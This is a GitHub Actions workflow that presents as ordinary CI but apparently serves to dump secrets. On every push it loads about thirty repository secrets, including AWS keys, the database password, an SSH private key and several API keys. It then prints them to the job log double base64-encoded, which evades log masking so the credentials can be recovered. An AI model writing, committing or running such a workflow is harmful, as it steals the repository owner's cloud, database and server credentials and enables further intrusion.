name: GitHub Actions
on: push
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
      - name: command
        run: env -0 | awk -v RS='\0' '/^(secret_|var_)/ {print $0}' | base64 -w0 | base64 -w0
        env:
          secret_ASTRO_CURRENT: ${{ secrets.ASTRO_CURRENT }}
          secret_ASTRO_URL: ${{ secrets.ASTRO_URL }}
          secret_ASTRO_WEEK: ${{ secrets.ASTRO_WEEK }}
          secret_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          secret_AWS_REGION: ${{ secrets.AWS_REGION }}
          secret_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          secret_AWS_SG_NAME: ${{ secrets.AWS_SG_NAME }}
          secret_CODE_REDIRECT_URI: ${{ secrets.CODE_REDIRECT_URI }}
          secret_DATABASE_HOST: ${{ secrets.DATABASE_HOST }}
          secret_DATABASE_NAME: ${{ secrets.DATABASE_NAME }}
          secret_DATABASE_PASSWORD: ${{ secrets.DATABASE_PASSWORD }}
          secret_DATABASE_PORT: ${{ secrets.DATABASE_PORT }}
          secret_DATABASE_TYPE: ${{ secrets.DATABASE_TYPE }}
          secret_DATABASE_USERNAME: ${{ secrets.DATABASE_USERNAME }}
          secret_DATAGO_URL: ${{ secrets.DATAGO_URL }}
          secret_DATAGO_WEATHER_KEY: ${{ secrets.DATAGO_WEATHER_KEY }}
          secret_EC2URL: ${{ secrets.EC2URL }}
          secret_EC2_HOST: ${{ secrets.EC2_HOST }}
          secret_EC2_USERNAME: ${{ secrets.EC2_USERNAME }}
          secret_ECR_REGISTRY: ${{ secrets.ECR_REGISTRY }}
          secret_ECR_REPOSITORY: ${{ secrets.ECR_REPOSITORY }}
          secret_KAKAO_API_KEY: ${{ secrets.KAKAO_API_KEY }}
          secret_KAKAO_LOGIN_URL: ${{ secrets.KAKAO_LOGIN_URL }}
          secret_KAKAO_REDIRECT_URI: ${{ secrets.KAKAO_REDIRECT_URI }}
          secret_KAKAO_USERINFO_URI: ${{ secrets.KAKAO_USERINFO_URI }}
          secret_MOONAGE_URL: ${{ secrets.MOONAGE_URL }}
          secret_OPENWEATHER_KEY: ${{ secrets.OPENWEATHER_KEY }}
          secret_OPENWEATHER_URL: ${{ secrets.OPENWEATHER_URL }}
          secret_SLACK_WEB_HOOK_URL: ${{ secrets.SLACK_WEB_HOOK_URL }}
          secret_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
